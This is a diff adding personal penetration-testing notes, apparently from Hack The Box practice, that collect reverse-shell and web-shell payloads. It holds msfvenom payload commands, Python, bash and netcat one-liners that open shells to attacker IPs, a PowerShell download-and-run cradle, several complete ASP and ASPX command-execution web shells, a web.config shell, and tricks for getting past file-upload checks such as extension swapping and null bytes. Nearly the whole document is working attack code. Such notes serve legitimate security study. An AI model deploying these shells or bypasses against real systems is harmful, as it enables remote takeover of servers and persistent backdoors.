@@ -1,0 +1,259 @@
+Reverse shells:
+==========
+Making shells:
+	msfvenom:
+		redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/
+		sometimes we need to make payloads for BOF, it means we need to get our payload under a limited set of bytes, but with most payloads bytes are more than 1k, so:
+			-p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).downloadstring('http://ip/Invoke-PowershellTcp.ps1')\" "
+				it will give us PS shell, bytes < 1k
+	pentestmonkey:
+		http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+		note most of his shells are one liner, so, if we want to put a shell file, we need to make changes
+		(like in bashed privesc)
+Linux Payloads:
+	elf:
+		Stageless:
+			msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+			msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+		Staged:
+			msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+			msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+	bash:
+		msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
+	binary:
+python shell:(one-liner)
+	1. python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
+	2.  python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/sh”)’
+Web Shells:
+	webshells in kali:
+		/usr/share/webshells
+		/usr/share/seclists/webshells/
+	Netcat webshell:
+		1. direct use nc.exe => read in exploitation sheet
+		2. rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f
+		3. rm -f /tmp/p; mknod /tmp/p p && nc 10.10.10.10 9999 0/tmp/p
+		Making .sh file of above payload:
+			#!bin/bash/
+			rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f
+	Bash reverse shells:
+		bash -i >& /dev/tcp/10.10.10.10/9999 0>&1
+		0<&196;exec 196<>/dev/tcp/10.10.10.10/9999; sh <&196 >&196 2>&196
+		exec 5<> /dev/tcp/10.10.10.10/9999; cat <&5 | while read line; do $line 2>&5>&5; done
+	php reverse shells:
+		1. php shell using nc:
+			put nc.exe on website
+			<?php echo shell_exec('nc.exe 10.10.16.32 4444 -e cmd.exe'); ?>
+			nc -nvlp 4444
+		2. github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+		3. /usr/share/laudanum/php/php-reverse-shell.php
+		Note:	
+			To understand PHP shells => read PHP Vulnerabilities sheet
+	Shells for IIS:
+		aspx shells:
+			1. /usr/share/webshells/aspx/cmdasp.aspx
+				it will make a dialouge box on webpage, to execute commands
+				used in HTB::silo
+			2. msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=192.168.119.201 LPORT=4444 -o reverse-shell.aspx
+				used in HTB::Granny, HTB::devel
+			3. https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx
+				Its a great shell, by far the best
+			4. Custom-Shell 1:
+				<%-- ASPX Shell by LT <lt@mac.hush.com> (2007) --%>
+				<%@ Page Language="C#" EnableViewState="false" %>
+				<%@ Import Namespace="System.Web.UI.WebControls" %>
+				<%@ Import Namespace="System.Diagnostics" %>
+				<%@ Import Namespace="System.IO" %>
+				<%
+				Set rs = CreateObject("WScript.shell")
+				Set cmd = rs.Exec("cmd /c command_to_run")
+				o = cmd.StdOut.Readall()
+				Response.write(o)
+				%>
+			5. Custom-Shell 2:
+				<%@ Page Language="C#" Debug="true" Trace="false" %>
+				<%@ Import Namespace="System.Diagnostics" %>
+				<%@ Import Namespace="System.IO" %>
+				<script Language="c#" runat="server">
+				void Page_Load(object sender, EventArgs e)
+				{
+				}
+				string ExcuteCmd(string arg)
+				{
+				ProcessStartInfo psi = new ProcessStartInfo();
+				psi.FileName = "cmd.exe";
+				psi.Arguments = "/c "+arg;
+				psi.RedirectStandardOutput = true;
+				psi.UseShellExecute = false;
+				Process p = Process.Start(psi);
+				StreamReader stmrdr = p.StandardOutput;
+				string s = stmrdr.ReadToEnd();
+				stmrdr.Close();
+				return s;
+				}
+				void cmdExe_Click(object sender, System.EventArgs e)
+				{
+				Response.Write("<pre>");
+				Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
+				Response.Write("</pre>");
+				}
+				</script>
+				<HTML>
+				<HEAD>
+				<title>awen asp.net webshell</title>
+				</HEAD>
+				<body >
+				<form id="cmd" method="post" runat="server">
+				<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
+				<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
+				<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
+				</form>
+				</body>
+				</HTML>
+		asp shells:
+			1. /usr/share/webshells/asp/cmdasp.asp
+			2. msfvenom -p windows/shell_reverse_tcp -f asp LHOST=192.168.119.201 LPORT=4444 -o reverse-shell.asp 
+			3. github.com/tennc/webshell/blob/master/asp/webshell.asp
+			4. github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
+			5. Custom-Shell 1:
+				<%
+				Dim oS
+				On Error Resume Next
+				Set oS = Server.CreateObject("WSCRIPT.SHELL")
+				Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
+				%>
+				Note:
+					It requires to upload an executable shell too
+			6. Custom-Shell 2:
+				<%
+				Dim oS,oSNet,oFSys, oF,szCMD, szTF
+				On Error Resume Next
+				Set oS = Server.CreateObject("WSCRIPT.SHELL")
+				Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
+				Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
+				szCMD = Request.Form("C")
+				If (szCMD <> "") Then
+				  szTF = "c:\windows\pchealth\ERRORREP\QHEADLES\" &  oFSys.GetTempName()
+				  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF &
+				"""",0,True)
+				  response.write szTF
+				  ' Change perms
+				  Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G
+				everyone:F",0,True)
+				  Set oF = oFSys.OpenTextFile(szTF,1,False,0)
+				End If 
+				%>
+				<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+				<input type=text name="C" size=70 value="<%= szCMD %>">
+				<input type=submit value="Run"></FORM><PRE>
+				Machine: <%=oSNet.ComputerName%><BR>
+				Username: <%=oSNet.UserName%><br>
+				<% 
+				If (IsObject(oF)) Then
+				  On Error Resume Next
+				  Response.Write Server.HTMLEncode(oF.ReadAll)
+				  oF.Close
+				  Call oS.Run("win.com cmd.exe /c del "& szTF,0,True)
+				End If 
+				%>
+			7. Custom-Shell 3:
+				<%@ Language=VBScript %>
+				<%
+
+				  Dim oScript
+				  Dim oScriptNet
+				  Dim oFileSys, oFile
+				  Dim szCMD, szTempFile
+
+				  On Error Resume Next
+
+				  ' -- create the COM objects that we will be using -- '
+				  Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+				  Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+				  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+
+				  ' -- check for a command that we have posted -- '
+				  szCMD = Request.Form(".CMD")
+				  If (szCMD <> "") Then
+
+				    ' -- Use a poor man's pipe ... a temp file -- '
+				    szTempFile = "C:\" & oFileSys.GetTempName( )
+				    Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
+				    Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
+
+				  End If
+
+				%>
+				<HTML>
+				<BODY>
+				<FORM action="<%= Request.ServerVariables("URL") %>" method="POST">
+				<input type=text name=".CMD" size=45 value="<%= szCMD %>">
+				<input type=submit value="Run">
+				</FORM>
+				<PRE>
+				<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
+				<br>
+				<%
+				  If (IsObject(oFile)) Then
+				    ' -- Read the output from our command and remove the temp file -- '
+				    On Error Resume Next
+				    Response.Write Server.HTMLEncode(oFile.ReadAll)
+				    oFile.Close
+				    Call oFileSys.DeleteFile(szTempFile, True)
+				  End If
+				%>
+				</BODY>
+				</HTML>
+		web.config shell:
+			web.config:
+				<?xml version="1.0" encoding="UTF-8"?>
+				<configuration>
+				   <system.webServer>
+				      <handlers accessPolicy="Read, Script, Write">
+				         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
+				      </handlers>
+				      <security>
+				         <requestFiltering>
+				            <fileExtensions>
+				               <remove fileExtension=".config" />
+				            </fileExtensions>
+				            <hiddenSegments>
+				               <remove segment="web.config" />
+				            </hiddenSegments>
+				         </requestFiltering>
+				      </security>
+				   </system.webServer>
+				</configuration>
+				<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
+				<%
+				Response.write("-"&"->")
+				' it is running the ASP code if you can see 3 by opening the web.config file!
+				Response.write(1+2)
+				Response.write("<!-"&"-")
+				%>
+				-->
+			Note:
+				Used in HTB::Bounty
+		NOTE:
+			iis server can have all these shells => aspx/asp/web.config/php
+			iis server can have php files allowed!
+	jsp shells:
+		Uploaded in coldfusion (htb::artic)
+		1. msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
+		2. /usr/share/webshells/cmdjsp.jsp
+		3. /usr/share/webshells/jsp-reverse.jsp
+	Bypassing the Upload checks:
+		for any file type:(universal)
+			There are checks in the upload section, they might use the MIME type information present in the HTTP header parameters to check what kind of a file is it.
+				MIME Type: image/jpeg, image/png, text/html
+			Another method which might fail most of the time is to just change the filename. If a png format file is allowed but not a php file, then just change the name from file.png to file.php. It might hinder the attack so you will have to keep all that in mind.
+				php phtml, .php, .php3, .php4, .php5, and .inc
+				asp asp, .aspx, .config
+				perl .pl, .pm, .cgi, .lib
+				jsp .jsp, .jspx, .jsw, .jsv, and .jspf
+				Coldfusion .cfm, .cfml, .cfc, .dbm
+		for aspx:(IIS server)
+			nullbyte:(%00)
+				upload aspx and intercept request
+					file="shell.aspx"
+				change it to
+					file="shell.aspx%00.jpg"
